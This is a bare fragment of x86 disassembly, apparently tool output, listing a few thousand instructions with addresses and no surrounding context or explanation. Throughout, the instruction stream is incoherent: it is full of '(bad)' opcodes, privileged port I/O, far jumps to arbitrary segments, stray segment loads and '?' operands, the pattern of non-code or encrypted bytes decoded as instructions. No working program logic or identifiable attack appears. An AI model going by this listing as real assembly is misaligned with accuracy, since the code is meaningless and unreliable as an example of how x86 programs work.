  41264f:	mov    cs,WORD PTR [esi]
  412651:	retf   
  412652:	xor    BYTE PTR [esi-0x10],0x1
  412656:	sub    al,0xb3
  412658:	inc    edi
  412659:	sub    al,0xfd
  41265b:	inc    ebp
  41265c:	in     eax,0xf
  41265e:	(bad)  
  41265f:	add    dl,ch
  412661:	(bad)  
  412662:	adc    BYTE PTR [edi],al
  412664:	mov    ds:0xd718b4ee,eax
  412669:	in     al,0x5d
  41266b:	and    ebp,0x2b4b582a
  412671:	xchg   edi,eax
  412672:	pop    ss
  412673:	or     ebx,eax
  412675:	jb     0x4126e8
  412677:	stc    
  412678:	mov    eax,DWORD PTR [eax]
  41267a:	push   cs
  41267b:	cmp    al,0x4c
  41267d:	in     eax,0xea
  41267f:	xchg   ebp,eax
  412680:	mov    bl,0xbb
  412682:	xchg   esp,eax
  412683:	sub    eax,0x4efa838c
  412688:	jge    0x41268d
  41268a:	and    ch,BYTE PTR [edi-0x698b5a]
  412690:	lds    esp,FWORD PTR [ebp-0x20]
  412693:	mov    ah,0xed
  412695:	pop    ds
  412696:	sub    DWORD PTR [esi+0x1c090872],esp
  41269c:	into   
  41269d:	inc    edi
  41269e:	(bad)  
  41269f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4126a0:	cmc    
  4126a1:	sub    BYTE PTR [ebp-0x65],bh
  4126a4:	xor    al,0xb4
  4126a6:	aad    0x52
  4126a8:	jno    0x4126ed
  4126aa:	fsubp  st(5),st
  4126ac:	fadd   QWORD PTR [ecx+0x5c]
  4126af:	inc    ecx
  4126b0:	mov    esp,0xfcdb737f
  4126b5:	in     eax,dx
  4126b6:	out    dx,al
  4126b7:	push   ecx
  4126b8:	jmp    0x284e:0xaf1e5780
  4126bf:	addps  xmm4,xmm1
  4126c2:	scas   al,BYTE PTR es:[edi]
  4126c3:	and    ebx,DWORD PTR ds:0xf6d0b00
  4126c9:	xchg   edx,eax
  4126ca:	cmp    esi,ebx
  4126cc:	and    al,0x90
  4126ce:	sub    al,0xad
  4126d0:	pop    edx
  4126d1:	push   es
  4126d2:	cdq    
  4126d3:	fisubr DWORD PTR [edx]
  4126d5:	popa   
  4126d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4126d7:	mov    ecx,0x497b4822
  4126dc:	nop
  4126dd:	sbb    al,0xd4
  4126df:	push   cs
  4126e0:	inc    edi
  4126e1:	imul   edx,esi,0xffffffac
  4126e4:	mov    ebp,ebx
  4126e6:	lds    ebx,FWORD PTR [ebx-0x1c]
  4126e9:	jmp    0x5c706b73
  4126ee:	mov    ebp,ebp
  4126f0:	cli    
  4126f1:	or     eax,0xaf5eb400
  4126f6:	push   ss
  4126f7:	mov    edx,0x6a48c500
  4126fc:	mov    bh,dh
  4126fe:	sbb    dh,dh
  412700:	cmc    
  412701:	mov    eax,ds:0x57a4f4fd
  412706:	jge    0x4126ff
  412708:	xchg   esp,eax
  412709:	mov    eax,ds:0x9e4cb4fb
  41270e:	lds    esp,FWORD PTR [ebp-0x6eeb0055]
  412714:	inc    ebp
  412715:	(bad)  
  412716:	shl    BYTE PTR [edx-0x25],cl
  412719:	outs   dx,BYTE PTR ds:[esi]
  41271a:	lea    ebx,[ebx-0x35]
  41271d:	fadd   QWORD PTR [eax]
  41271f:	stc    
  412720:	pop    ds
  412721:	cwde   
  412722:	and    al,0x9e
  412724:	jb     0x412766
  412726:	mov    dh,0x32
  412728:	inc    ebp
  412729:	js     0x412703
  41272b:	sub    ebp,DWORD PTR [ebp-0x25]
  41272e:	jno    0x4126b7
  412730:	ds lahf 
  412732:	jbe    0x41276d
  412734:	retf   0xf10
  412737:	ja     0x4126bf
  412739:	push   es
  41273a:	push   ss
  41273b:	cli    
  41273c:	sub    dh,0x6f
  41273f:	and    BYTE PTR [esi],al
  412741:	push   es
  412742:	xchg   edi,eax
  412743:	mov    edi,0x323df011
  412748:	retf   0x6c74
  41274b:	jae    0x41275a
  41274d:	pop    ss
  41274e:	pop    DWORD PTR [edi+0x22710088]
  412754:	jge    0x41278b
  412756:	cdq    
  412757:	mov    al,0xc8
  412759:	aam    0xe1
  41275b:	add    eax,0xe9d11d85
  412760:	or     bh,BYTE PTR [ebp-0x62]
  412763:	jns    0x4126f6
  412765:	fistp  WORD PTR [eax+0xd922900]
  41276b:	add    edx,DWORD PTR [eax-0x74]
  41276e:	sub    al,0x75
  412770:	ret    
  412771:	les    ebp,FWORD PTR [ebp+0x30]
  412774:	scas   al,BYTE PTR es:[edi]
  412775:	push   edi
  412776:	popa   
  412777:	sub    ebx,DWORD PTR [edi+0x23]
  41277a:	(bad)  [ebx-0x56]
  41277d:	cli    
  41277e:	sbb    eax,esi
  412780:	inc    eax
  412781:	rol    DWORD PTR [esi-0x33],cl
  412784:	or     bl,0x14
  412787:	xchg   ebx,eax
  412788:	push   0xf30714f2
  41278d:	push   0x556f9237
  412792:	frstor [ebx+edx*8+0x4c]
  412796:	hlt    
  412797:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412798:	push   ebp
  412799:	ins    DWORD PTR es:[edi],dx
  41279a:	sub    DWORD PTR [esi],esp
  41279c:	xchg   edi,eax
  41279d:	retf   0x8611
  4127a0:	pop    esp
  4127a1:	ret    
  4127a2:	jle    0x41274b
  4127a4:	pushf  
  4127a5:	retf   
  4127a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4127a7:	sbb    al,0x68
  4127a9:	jnp    0x4127c9
  4127ab:	mov    edi,0xdf95b062
  4127b0:	mov    al,0x5c
  4127b2:	loop   0x412819
  4127b4:	(bad)
  4127b7:	sbb    BYTE PTR [ebp+0x3eda4dba],0xc1
  4127be:	retf   0x85f1
  4127c1:	push   es
  4127c2:	sbb    al,0x5
  4127c4:	ror    ecx,cl
  4127c6:	jmp    0x66780ff9
  4127cb:	js     0x412803
  4127cd:	xor    ebx,ebx
  4127cf:	push   eax
  4127d0:	in     al,dx
  4127d1:	push   es
  4127d2:	push   ss
  4127d3:	sti    
  4127d4:	(bad)  
  4127d5:	aam    0xa5
  4127d7:	mov    BYTE PTR [edi+0x4f],cl
  4127da:	inc    ecx
  4127db:	sbb    eax,0xc9ef3579
  4127e0:	js     0x41283b
  4127e2:	test   eax,0xc0fdce99
  4127e7:	fnsave [ebp+0x76]
  4127ea:	jmp    0x8433:0x6c190cf5
  4127f1:	mov    edx,0x19aca910
  4127f6:	(bad)  
  4127f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4127f8:	mov    ?,WORD PTR [ebp-0x32]
  4127fb:	add    DWORD PTR [eax-0x150c8245],0x42
  412802:	inc    ecx
  412803:	sub    DWORD PTR [ecx-0x1db6398],eax
  412809:	pop    ebx
  41280a:	cmp    BYTE PTR [esi],dl
  41280c:	mov    bh,0x5a
  41280e:	jnp    0x41288b
  412810:	inc    edx
  412811:	xchg   edi,eax
  412812:	cdq    
  412813:	xor    al,0x85
  412815:	jle    0x412832
  412817:	ja     0x4127df
  412819:	jmp    0xb000:0x9ae048a5
  412820:	dec    ecx
  412821:	inc    ecx
  412822:	jp     0x4127e8
  412824:	xor    al,0xf1
  412826:	ret    0x588b
  412829:	aad    0x13
  41282b:	cs ins DWORD PTR es:[edi],dx
  41282d:	mov    WORD PTR [ecx+0x7879d9bb],ss
  412833:	cmp    edi,DWORD PTR [edx-0x5dcb44de]
  412839:	xchg   ecx,eax
  41283a:	push   ebx
  41283b:	ja     0x412854
  41283d:	mov    al,0xe5
  41283f:	jmp    0x4127f1
  412841:	loopne 0x4127e8
  412843:	inc    esi
  412844:	das    
  412845:	cli    
  412846:	xlat   BYTE PTR ds:[ebx]
  412847:	into   
  412848:	and    eax,0x2fd5d57d
  41284d:	jge    0x412812
  41284f:	cmp    edx,DWORD PTR [ebp+0x26]
  412852:	sbb    DWORD PTR [esi-0xb],0x211894d2
  412859:	or     eax,DWORD PTR [ecx-0x546d452f]
  41285f:	test   eax,0x8b88b565
  412864:	mov    eax,0xf65bdf25
  412869:	scas   al,BYTE PTR es:[edi]
  41286a:	(bad)  
  41286b:	clc    
  41286c:	lea    ebx,[esi-0x71896fac]
  412872:	dec    eax
  412873:	cmp    BYTE PTR [esi-0x61d768ed],bh
  412879:	inc    ebx
  41287a:	xor    ecx,esi
  41287c:	rol    ecx,1
  41287e:	fwait
  41287f:	sar    DWORD PTR [ebx-0x7c25d06f],1
  412885:	mov    ebx,0xb3a265be
  41288a:	popa   
  41288b:	push   cs
  41288c:	xchg   edx,eax
  41288d:	inc    edi
  41288e:	pop    ebx
  41288f:	imul   ecx,DWORD PTR [ebp-0x61],0x4e
  412893:	stc    
  412894:	or     al,0xf3
  412896:	mov    edi,0x86d40caa
  41289b:	dec    esp
  41289c:	es adc al,0x97
  41289f:	jl     0x412849
  4128a1:	retf   
  4128a2:	push   0x64c67e4f
  4128a7:	xchg   DWORD PTR [eax+ebp*2],ebp
  4128aa:	sbb    DWORD PTR [ecx],ecx
  4128ac:	(bad)  
  4128ad:	and    DWORD PTR [edx-0x3fa257a8],esp
  4128b3:	inc    edi
  4128b4:	xchg   DWORD PTR [edi-0x7f],ebx
  4128b7:	in     eax,0xf7
  4128b9:	push   esi
  4128ba:	jns    0x4128a6
  4128bc:	mov    bx,0x5bb0
  4128c0:	mov    bh,0x32
  4128c2:	xor    al,0xab
  4128c4:	mov    bh,0x8b
  4128c6:	out    dx,al
  4128c7:	je     0x4128a0
  4128c9:	xchg   DWORD PTR [eax],ebx
  4128cb:	inc    BYTE PTR [edx+0x1e730996]
  4128d1:	and    al,0xb1
  4128d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4128d4:	push   ebp
  4128d5:	adc    eax,0x98e81d7d
  4128da:	mov    ecx,0x9b1dd329
  4128df:	xchg   edx,eax
  4128e0:	add    ah,ah
  4128e2:	enter  0xa70b,0xca
  4128e6:	push   0x53
  4128e8:	cmp    eax,0xb9c44988
  4128ed:	xchg   ecx,eax
  4128ee:	mov    WORD PTR [edx],ss
  4128f0:	(bad)  
  4128f1:	xchg   esi,eax
  4128f2:	aaa    
  4128f3:	mov    eax,ds:0x7906cd54
  4128f8:	mov    ebx,ecx
  4128fa:	mov    fs,ebp
  4128fc:	inc    esp
  4128fd:	dec    ecx
  4128fe:	mov    esi,0x3d867cac
  412903:	call   0x9ca6ad6a
  412908:	jge    0x412921
  41290a:	out    0xc8,eax
  41290c:	nop
  41290d:	dec    edi
  41290e:	popa   
  41290f:	(bad)  
  412910:	(bad)  
  412911:	(bad)  
  412912:	lock mov dh,0xe
  412915:	push   ds
  412916:	or     eax,0x726b68b6
  41291b:	retf   
  41291c:	cld    
  41291d:	popf   
  41291e:	xor    ah,0x19
  412921:	sub    ecx,DWORD PTR [esi]
  412923:	dec    ecx
  412924:	ins    DWORD PTR es:[edi],dx
  412925:	sub    al,0x33
  412927:	dec    ebx
  412928:	mov    eax,0x8c38ce6b
  41292d:	mov    eax,ds:0xc96427f1
  412932:	mov    ebx,0x5ad03e21
  412937:	jmp    0x60e638cb
  41293c:	pusha  
  41293d:	push   ds
  41293e:	inc    edi
  41293f:	leave  
  412940:	inc    edx
  412941:	imul   edi,DWORD PTR [edi],0xc8851915
  412947:	xchg   ebx,eax
  412948:	mov    ds:0xdbc138d6,eax
  41294d:	sahf   
  41294e:	repnz outs dx,DWORD PTR ds:[esi]
  412950:	loop   0x412993
  412952:	mov    al,ds:0xfe598650
  412957:	(bad)
  41295a:	cmp    BYTE PTR [edx],cl
  41295c:	xor    al,0xc5
  41295e:	repz je 0x4129ce
  412961:	push   ss
  412962:	shl    ch,0x5d
  412965:	lea    esp,[edx]
  412967:	xchg   esp,eax
  412968:	(bad)  
  412969:	das    
  41296a:	call   0xa095:0xd8fe0e0c
  412971:	cs ins BYTE PTR es:[edi],dx
  412973:	jno    0x412915
  412975:	pop    esp
  412976:	outs   dx,DWORD PTR ds:[esi]
  412977:	cmp    al,0x93
  412979:	daa    
  41297a:	adc    BYTE PTR [ebx-0x49],cl
  41297d:	pusha  
  41297e:	xchg   ecx,eax
  41297f:	xor    al,0xfa
  412981:	xchg   edx,eax
  412982:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412983:	mov    ds:0x2999d8c8,al
  412988:	popf   
  412989:	or     ebp,esi
  41298b:	into   
  41298c:	inc    eax
  41298d:	lods   eax,DWORD PTR ds:[esi]
  41298e:	(bad)  
  41298f:	in     eax,dx
  412990:	pop    edx
  412991:	or     bh,0xab
  412994:	cmp    al,BYTE PTR [edx-0x2d323b42]
  41299a:	xchg   ebp,eax
  41299b:	and    DWORD PTR [ebx-0x45],esi
  41299e:	fdivrp st(5),st
  4129a0:	pop    ebp
  4129a1:	jae    0x412a01
  4129a3:	xlat   BYTE PTR ss:[ebx]
  4129a5:	xor    DWORD PTR [eax-0x54],0x51221cd4
  4129ac:	scas   eax,DWORD PTR es:[edi]
  4129ad:	enter  0x7b21,0xdc
  4129b1:	outs   dx,DWORD PTR ds:[esi]
  4129b2:	mov    esp,0x41fcd7ad
  4129b7:	cmp    BYTE PTR [edi*4+0x350750a5],bl
  4129be:	outs   dx,BYTE PTR ds:[esi]
  4129bf:	and    al,0x46
  4129c1:	dec    esi
  4129c2:	daa    
  4129c3:	daa    
  4129c4:	push   edi
  4129c5:	in     al,dx
  4129c6:	pop    ebp
  4129c7:	leave  
  4129c8:	stos   BYTE PTR es:[edi],al
  4129c9:	test   eax,0x80394bff
  4129ce:	or     edx,DWORD PTR [edx-0x43]
  4129d1:	mov    ebp,0x3ff36504
  4129d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4129d7:	xchg   bh,dl
  4129d9:	jecxz  0x4129e2
  4129db:	and    DWORD PTR [ebx+0x26],edx
  4129de:	neg    BYTE PTR [ebx]
  4129e0:	mov    edx,0x42f89e58
  4129e5:	loop   0x4129fd
  4129e7:	(bad)  
  4129e8:	cwde   
  4129e9:	jl     0x4129ee
  4129eb:	push   es
  4129ec:	pop    ecx
  4129ed:	(bad)  
  4129ee:	cld    
  4129ef:	(bad)  
  4129f0:	mov    dh,0x1c
  4129f2:	add    BYTE PTR [ebx],cl
  4129f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4129f5:	ficomp DWORD PTR [ecx+esi*2]
  4129f8:	aad    0xb4
  4129fa:	(bad)  
  4129fb:	push   ss
  4129fc:	or     eax,0x3414df2a
  412a01:	mov    gs,WORD PTR [eax]
  412a03:	mov    dh,0xd3
  412a05:	mov    edx,DWORD PTR cs:[esi-0x48e0643]
  412a0c:	test   BYTE PTR [edx+0x72],al
  412a0f:	jg     0x4129da
  412a11:	or     bh,ah
  412a13:	mov    edx,0x3f219029
  412a18:	sti    
  412a19:	stos   DWORD PTR es:[edi],eax
  412a1a:	mov    ch,0x4d
  412a1c:	cwde   
  412a1d:	mov    al,0xcf
  412a1f:	pop    eax
  412a20:	xchg   esi,eax
  412a21:	out    dx,al
  412a22:	pushf  
  412a23:	sub    DWORD PTR [eax],esp
  412a25:	in     al,dx
  412a26:	adc    al,0xb5
  412a28:	lea    edx,[edx]
  412a2a:	mov    al,0xb3
  412a2c:	and    dl,ah
  412a2e:	sbb    eax,0x3a310fe7
  412a33:	sub    ebx,DWORD PTR [eax+0x776e72a9]
  412a39:	pop    edx
  412a3a:	mov    BYTE PTR [esi+eax*1-0x3b],dl
  412a3e:	push   0x9ffe94a5
  412a43:	sbb    esi,DWORD PTR [eax+0x7f]
  412a46:	clc    
  412a47:	jb     0x4129f5
  412a49:	inc    esp
  412a4a:	clc    
  412a4b:	cdq    
  412a4c:	and    al,0x25
  412a4e:	stos   BYTE PTR es:[edi],al
  412a4f:	scas   eax,DWORD PTR es:[edi]
  412a50:	jecxz  0x412a01
  412a52:	retf   0x21d1
  412a55:	adc    al,0x53
  412a57:	dec    edx
  412a58:	loop   0x412ac6
  412a5a:	mov    dh,BYTE PTR [edi]
  412a5c:	std    
  412a5d:	pop    es
  412a5e:	loope  0x412a5e
  412a60:	push   es
  412a61:	and    al,0x56
  412a63:	rcl    ah,0x38
  412a66:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412a67:	add    DWORD PTR [esi+0x61b1cd9f],0x502024a9
  412a71:	mov    edx,DWORD PTR [edi+0x38230d29]
  412a77:	mov    ah,0x7e
  412a79:	jne    0x412ab1
  412a7b:	loop   0x412a54
  412a7d:	hlt    
  412a7e:	or     eax,0xd010e8f4
  412a83:	fld    TBYTE PTR [ebx-0x3f]
  412a86:	retf   
  412a87:	(bad)  
  412a88:	lods   eax,DWORD PTR ds:[esi]
  412a89:	or     cl,ch
  412a8b:	xor    eax,DWORD PTR [edx+0x7611e631]
  412a91:	or     al,0xde
  412a93:	rcr    BYTE PTR [eax+0x2d],1
  412a96:	mov    DWORD PTR [esi+0x4c],ebx
  412a99:	cmp    edx,0xffffffb7
  412a9c:	or     bh,BYTE PTR [edi-0x5f]
  412a9f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412aa0:	push   edi
  412aa1:	sti    
  412aa2:	aas    
  412aa3:	add    ebx,DWORD PTR [esi+0x32]
  412aa6:	lods   eax,DWORD PTR ds:[esi]
  412aa7:	daa    
  412aa8:	shl    DWORD PTR [ebp+0x205f9039],0xe7
  412aaf:	pop    ds
  412ab0:	sub    esi,DWORD PTR [esi-0x32]
  412ab3:	lods   al,BYTE PTR ds:[esi]
  412ab4:	lds    ecx,FWORD PTR [edx+0x6a]
  412ab7:	jmp    0xc9115e3
  412abc:	into   
  412abd:	lahf   
  412abe:	imul   eax,DWORD PTR [edx-0x7a2ab845],0x7692443d
  412ac8:	test   BYTE PTR [esi],cl
  412aca:	retf   
  412acb:	jo     0x412a95
  412acd:	mov    eax,0x784e91d2
  412ad2:	xor    dh,BYTE PTR [ecx]
  412ad4:	add    bl,al
  412ad6:	or     al,0xd6
  412ad8:	std    
  412ad9:	adc    al,0x72
  412adb:	(bad)  
  412adc:	(bad)  
  412add:	call   FWORD PTR [ebp+0x74f3fedd]
  412ae3:	stos   BYTE PTR es:[edi],al
  412ae4:	lods   al,BYTE PTR ds:[esi]
  412ae5:	mov    BYTE PTR [edx-0x67],ch
  412ae8:	adc    al,0x42
  412aea:	leave  
  412aeb:	fld    QWORD PTR [eax-0x4a]
  412aee:	lock dec ebx
  412af0:	aam    0x6e
  412af2:	inc    ecx
  412af3:	out    dx,al
  412af4:	jp     0x412b56
  412af6:	mov    dh,cl
  412af8:	push   esp
  412af9:	test   BYTE PTR [ecx],dl
  412afb:	jnp    0x412ab4
  412afd:	cmp    dl,ah
  412aff:	scas   eax,DWORD PTR es:[edi]
  412b00:	cmc    
  412b01:	sbb    al,0x9c
  412b03:	fucom  st(7)
  412b05:	ins    DWORD PTR es:[edi],dx
  412b06:	pmulhw mm6,QWORD PTR [ebx-0x77314782]
  412b0d:	lock inc edi
  412b0f:	mov    ds,WORD PTR [eax]
  412b11:	fst    QWORD PTR [edx+ecx*1-0x3f2af4c8]
  412b18:	or     DWORD PTR [edx-0x354e4fbd],ebp
  412b1e:	sub    dl,dl
  412b20:	or     esi,ebp
  412b22:	mov    dl,0x27
  412b24:	ins    DWORD PTR es:[edi],dx
  412b25:	ret    0x3726
  412b28:	inc    edx
  412b29:	js     0x412aec
  412b2b:	mov    al,0xf3
  412b2d:	xchg   ebx,eax
  412b2e:	sub    eax,0x31a8070b
  412b33:	jmp    0xd3234c47
  412b38:	inc    ecx
  412b39:	inc    esi
  412b3a:	jbe    0x412ac3
  412b3c:	add    eax,0xd7344b95
  412b41:	aam    0xba
  412b43:	dec    esp
  412b44:	in     eax,0x9b
  412b46:	sub    ebp,DWORD PTR [ebx-0x67]
  412b49:	call   0xb48431bb
  412b4e:	mov    eax,ds:0xfd8d106b
  412b53:	mov    gs,WORD PTR [eax-0x1a]
  412b56:	xchg   ebp,eax
  412b57:	xlat   BYTE PTR ds:[ebx]
  412b58:	shl    ah,cl
  412b5a:	adc    ch,BYTE PTR [esi]
  412b5c:	sahf   
  412b5d:	inc    esi
  412b5e:	dec    edi
  412b5f:	push   dx
  412b61:	push   ebx
  412b62:	sub    dl,cl
  412b64:	dec    ebp
  412b65:	push   ecx
  412b66:	dec    ebx
  412b67:	int3   
  412b68:	xor    eax,0xdbd04211
  412b6d:	xor    BYTE PTR [edi+0x53e74a65],bl
  412b73:	outs   dx,BYTE PTR ds:[esi]
  412b74:	jbe    0x412b6d
  412b76:	mov    bh,0xcf
  412b78:	lock push es
  412b7a:	mov    esi,0x3ed61c70
  412b7f:	(bad)  
  412b80:	lea    edx,[bx+si]
  412b83:	dec    edi
  412b84:	mov    ch,0x8e
  412b86:	mov    al,0xbf
  412b88:	outs   dx,DWORD PTR ds:[esi]
  412b89:	pop    ebx
  412b8a:	xlat   BYTE PTR ds:[ebx]
  412b8b:	repz iret 
  412b8d:	test   DWORD PTR [esi+ecx*4+0x7],edx
  412b91:	xlat   BYTE PTR ds:[ebx]
  412b92:	fst    st(3)
  412b94:	jb     0x412b74
  412b96:	ins    DWORD PTR es:[edi],dx
  412b97:	mov    ah,0xa0
  412b99:	call   0xd8f47a2d
  412b9e:	xchg   ecx,eax
  412b9f:	aas    
  412ba0:	int    0xd7
  412ba2:	xchg   DWORD PTR [edi+0xa8b6a6],eax
  412ba8:	(bad)  
  412baa:	loopne 0x412bad
  412bac:	stos   BYTE PTR es:[edi],al
  412bad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412bae:	retf   0x640
  412bb1:	dec    esi
  412bb2:	fisub  DWORD PTR [ecx-0x256d3e47]
  412bb8:	push   cs
  412bb9:	dec    esi
  412bba:	xchg   ebx,eax
  412bbb:	sbb    DWORD PTR [ecx+0x50],esp
  412bbe:	cmp    al,0xca
  412bc0:	jl     0x412c41
  412bc2:	cmp    eax,0x384d8bfa
  412bc7:	mov    ah,0xfd
  412bc9:	mov    ds,WORD PTR [ebx-0x779edd5]
  412bcf:	sbb    esi,DWORD PTR [eax]
  412bd1:	cld    
  412bd2:	pop    edx
  412bd3:	sahf   
  412bd4:	pop    ebx
  412bd5:	ss test eax,0x31a0c5a7
  412bdb:	cmp    DWORD PTR [ebx],eax
  412bdd:	sub    dl,cl
  412bdf:	scas   eax,DWORD PTR es:[edi]
  412be0:	mov    dh,0xe1
  412be2:	mov    esi,0xa40c6057
  412be7:	shl    dh,cl
  412be9:	sub    BYTE PTR [ecx],bh
  412beb:	mov    eax,DWORD PTR [ecx-0x6fe07168]
  412bf1:	popa   
  412bf2:	std    
  412bf3:	xor    BYTE PTR [ebp-0x64e0a27f],bl
  412bf9:	and    ch,dh
  412bfb:	test   BYTE PTR [esi+0x61],dl
  412bfe:	sbb    dl,BYTE PTR [esi+0x3e]
  412c01:	adc    eax,0x6b792b66
  412c06:	test   eax,0x60366625
  412c0b:	xor    eax,0x1a7eba5a
  412c10:	retf   
  412c11:	push   esp
  412c12:	xor    DWORD PTR [ecx-0x535b0dae],esp
  412c18:	mov    edi,0xfa37789c
  412c1d:	jb     0x412bda
  412c1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412c20:	fadd   st,st(6)
  412c22:	mov    al,0x12
  412c24:	sbb    BYTE PTR [edx+0x5cd39277],dl
  412c2a:	ins    BYTE PTR es:[edi],dx
  412c2b:	mov    eax,0x5a3cac98
  412c30:	inc    ecx
  412c31:	mov    edx,0x78547f72
  412c36:	ds dec edx
  412c38:	scas   eax,DWORD PTR es:[edi]
  412c39:	or     DWORD PTR [ebp+0x6d],ebp
  412c3c:	mov    edi,0xccaa059
  412c41:	sub    bh,al
  412c43:	jecxz  0x412c62
  412c45:	jg     0x412c55
  412c47:	aam    0x33
  412c49:	mov    dl,0xd1
  412c4b:	js     0x412c79
  412c4d:	sbb    BYTE PTR [eax-0x16],bl
  412c50:	sbb    al,0xf0
  412c52:	leave  
  412c53:	loopne 0x412c92
  412c55:	ja     0x412c42
  412c57:	(bad)  
  412c59:	jnp    0x412c17
  412c5b:	adc    ebp,DWORD PTR [ebp+0x7a]
  412c5e:	fadd   QWORD PTR [edi-0x6e8bc69e]
  412c64:	cs and bl,dh
  412c67:	popa   
  412c68:	mov    ecx,0x9ffb2fc5
  412c6d:	outs   dx,BYTE PTR ds:[esi]
  412c6e:	sub    edi,DWORD PTR [eax]
  412c70:	adc    edi,DWORD PTR [ecx]
  412c72:	sub    BYTE PTR [edi-0x458a2cd0],cl
  412c78:	pusha  
  412c79:	and    eax,0xce422275
  412c7e:	in     al,0x45
  412c80:	das    
  412c81:	or     al,BYTE PTR [edi]
  412c83:	dec    edi
  412c84:	add    ebp,edi
  412c86:	cs pop edi
  412c88:	int    0xc6
  412c8a:	and    al,0x69
  412c8c:	mov    ds:0x2ce59a0,eax
  412c91:	dec    esp
  412c92:	iret   
  412c93:	gs cli 
  412c95:	xchg   esi,eax
  412c96:	or     BYTE PTR [edx],ch
  412c98:	(bad)  
  412c99:	mov    ch,BYTE PTR [ebp-0x17]
  412c9c:	popf   
  412c9d:	gs inc esi
  412c9f:	pop    esp
  412ca0:	loope  0x412c60
  412ca2:	sbb    DWORD PTR [ebx-0x6546ab6c],edi
  412ca8:	fisttp WORD PTR [edi-0x215a7dc2]
  412cae:	fsub   QWORD PTR [esi-0x24]
  412cb1:	ret    
  412cb2:	fwait
  412cb3:	pop    edi
  412cb4:	dec    eax
  412cb5:	mov    esp,esi
  412cb7:	dec    ebx
  412cb8:	(bad)  
  412cb9:	cli    
  412cba:	jg     0x412d39
  412cbc:	and    al,0xe1
  412cbe:	mov    ds:0x8e9cad80,eax
  412cc4:	(bad)  
  412cc7:	pop    edx
  412cc8:	nop
  412cc9:	mov    dl,0x49
  412ccb:	fst    DWORD PTR [eax+0x5e213cef]
  412cd1:	ret    0xbc4c
  412cd4:	pop    ecx
  412cd5:	inc    edx
  412cd6:	or     ebx,ecx
  412cd8:	mov    ?,WORD PTR [ebx]
  412cda:	jae    0x412d22
  412cdc:	fwait
  412cdd:	mul    BYTE PTR [eax-0x1a15d303]
  412ce3:	fstp   TBYTE PTR [edx+0x21e51ba0]
  412ce9:	in     eax,0xd0
  412ceb:	mov    eax,ds:0xf1f617d
  412cf0:	push   eax
  412cf1:	jmp    0xfec2:0xd6ce8d4f
  412cf8:	or     ebp,DWORD PTR [ebp-0xc]
  412cfb:	das    
  412cfc:	jge    0x412cdb
  412cfe:	sbb    al,al
  412d00:	push   0xf506a25c
  412d05:	push   edi
  412d06:	jecxz  0x412d83
  412d08:	das    
  412d09:	or     eax,0x6b550a00
  412d0e:	xor    al,0x94
  412d10:	push   es
  412d11:	out    0x4,eax
  412d13:	int    0x7c
  412d15:	das    
  412d16:	or     al,0x5b
  412d18:	(bad)  [ecx-0x54]
  412d1b:	cmc    
  412d1c:	adc    DWORD PTR [ebx+0x67],edi
  412d1f:	push   ebp
  412d20:	mov    bl,0xd3
  412d22:	mov    edi,0xa942c951
  412d27:	stc    
  412d28:	ror    DWORD PTR [edi-0x6700d26],cl
  412d2e:	or     eax,0x546978f8
  412d33:	ror    DWORD PTR [edx],0xae
  412d36:	aaa    
  412d37:	lea    edi,[ebp+0x3f79f7a1]
  412d3d:	fwait
  412d3e:	mov    ah,0x80
  412d40:	dec    esi
  412d41:	push   ecx
  412d42:	fisubr WORD PTR [bp+di-0x35]
  412d46:	push   edi
  412d47:	push   ebx
  412d48:	lds    ecx,FWORD PTR [ebp-0xe05da06]
  412d4e:	mov    ecx,0x6b99cfc5
  412d53:	jne    0x412d4b
  412d55:	dec    ecx
  412d56:	dec    ecx
  412d57:	int3   
  412d58:	aas    
  412d59:	sub    ebp,ecx
  412d5b:	add    edx,ecx
  412d5d:	mov    bh,0xeb
  412d5f:	mov    al,BYTE PTR [ebx-0x2]
  412d62:	lahf   
  412d63:	fwait
  412d64:	popa   
  412d65:	stc    
  412d66:	(bad)  
  412d67:	push   esp
  412d68:	adc    al,0xe7
  412d6a:	sub    al,0xd
  412d6c:	adc    bh,BYTE PTR [ebx]
  412d6e:	in     eax,dx
  412d6f:	pusha  
  412d70:	jnp    0x412da4
  412d72:	mov    dh,0xd5
  412d74:	loope  0x412d7d
  412d76:	pop    ebp
  412d77:	loop   0x412dca
  412d79:	fs xchg ecx,esi
  412d7c:	sub    bh,BYTE PTR [ecx]
  412d7e:	xchg   ebp,eax
  412d7f:	in     al,0x48
  412d81:	adc    al,0x21
  412d83:	sahf   
  412d84:	cmc    
  412d85:	sbb    al,dh
  412d87:	inc    ebp
  412d88:	pushf  
  412d89:	mov    cl,0x2
  412d8b:	push   ecx
  412d8c:	mov    edx,DWORD PTR [edi]
  412d8e:	mov    ebx,0x48c1412c
  412d93:	cs push 0xffffffe9
  412d96:	mov    edi,0x7e6af28e
  412d9b:	sar    DWORD PTR [edx-0x2c],1
  412d9e:	push   edi
  412d9f:	and    esi,esp
  412da1:	push   edi
  412da2:	fst    st(1)
  412da4:	cmc    
  412da5:	lds    esp,FWORD PTR [ecx-0x10f7f0b0]
  412dab:	test   BYTE PTR [eax-0x29f37df2],ch
  412db1:	vpcomuq xmm9,xmm3,XMMWORD PTR [ebp+esi*4+0x1a09836d],0x22
  412dbc:	or     DWORD PTR [esi+0x17],ebp
  412dbf:	in     al,0xd3
  412dc1:	test   ebp,ecx
  412dc3:	ss xchg DWORD PTR gs:[edx-0x514acff6],ebp
  412dcb:	ret    
  412dcc:	out    0x2,eax
  412dce:	outs   dx,DWORD PTR ds:[esi]
  412dcf:	loopne 0x412e05
  412dd1:	mov    gs,WORD PTR [ebx-0x7e694764]
  412dd7:	mov    ch,0xd9
  412dd9:	mov    al,ds:0x9ad00b65
  412dde:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
